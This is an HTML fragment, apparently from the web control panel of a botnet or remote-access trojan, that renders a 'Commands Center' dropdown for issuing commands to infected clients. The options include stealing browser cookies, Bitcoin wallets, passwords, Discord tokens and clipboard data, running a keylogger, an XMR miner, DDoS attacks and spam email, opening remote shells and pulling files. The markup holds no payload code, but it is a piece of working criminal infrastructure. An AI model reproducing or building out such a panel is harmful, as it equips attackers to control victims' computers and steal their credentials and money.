<div class="col-12 col-sm-12 col-md-8 col-lg-6">
  <div class="card mb-3">
    <div class="card-header">
      <i class="fas fa-wrench"></i>
      Commands Center
    </div>
    <div class="card-body">
      <div style="height: 150px;" class="pt-4">
        <div class="row">
          <div class="col-lg-8 col-md-6 col-sm-12">
            <div class="form-group">
              <select class="form-control custom-select" name="command">
                <option value="nocommand" selected>Select Command</option>
                <optgroup label="Clients Commands">
                  <option value="ping">Ping</option>
                  <option value="msgbox">Show Messagebox</option>
                  <option value="tkschot">Take Screenshot</option>
                  <option value="stealps">Installed Softwares</option>
                  <option value="exec">Execute Script</option>
                  <option value="elev">Elevate User Status</option>
                  <option value="xmrminer">Execute XMR Miner</option>
                  <option value="tempclean">Clean TEMP Folder</option>
                  <option value="sendemail">Send Spam Email</option>
                  <option value="invokecustom">Execute Custom Plugin</option>
                  <option value="rshell">Execute Shell Commands</option>
                  <option value="getfile">Get a File from System </option>
                </optgroup>
                <optgroup label="Upload Files">
                  <option value="uploadfd">From Disk</option>
                  <option value="uploadf">From URL</option>
                </optgroup>
                <optgroup label="Torrent Seeder">
                  <option value="torrentf">From Disk</option>
                  <option value="torrentl">From URL</option>
                </optgroup>
                <optgroup label="Stealers">
                  <option value="stealcookie">Steal Firefox Cookies</option>
                  <option value="stealchcookie">Steal Chrome Cookies</option>
                  <option value="stealbtc">Steal Bitcoin Wallet</option>
                  <option value="stealpassword">Execute Password Stealer</option>
                  <option value="stealdiscord">Steal Discord Token</option>
                  <option value="getclipboard">Steal Clipboard Data</option>
                </optgroup>
                <optgroup label="Open Webpage">
                  <option value="openwp">Open Webpage (Visible)</option>
                  <option value="openhidden">Open Webpage (Hidden)</option>
                </optgroup>
                <optgroup label="DDOS Attack">
                  <option value="ddosw">Start DDOS</option>
                  <option value="stopddos">Stop DDOS</option>
                </optgroup>
                <optgroup label="Keylogger">
                  <option value="startkl">Start Keylogger</option>
                  <option value="stopkl">Stop Keylogger</option>
                  <option value="getlogs">Retreive Logs</option>
                </optgroup>
                <optgroup label="Computer Commands">
                  <option value="shutdown">Shutdown</option>
                  <option value="restart">Restart</option>
                  <option value="logoff">Logoff</option>
                </optgroup>
                <optgroup label="Clients Connection">
                  <option value="close">Close Connection</option>
                  <option value="moveclient">Move Client</option>
                  <option value="blacklist">Blacklist IP</option>
                  <option value="restart">Restart Client</option>
                  <option value="update">Update Client</option>
                  <option value="uninstall">Uninstall</option>
                </optgroup>
              </select>
            </div>
          </div>

          <div class="col-lg-4 col-md-8 col-sm-12">
            <button type="submit" name="Form1" for="Form1" class="btn btn-block btn-primary">
              Send Command
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>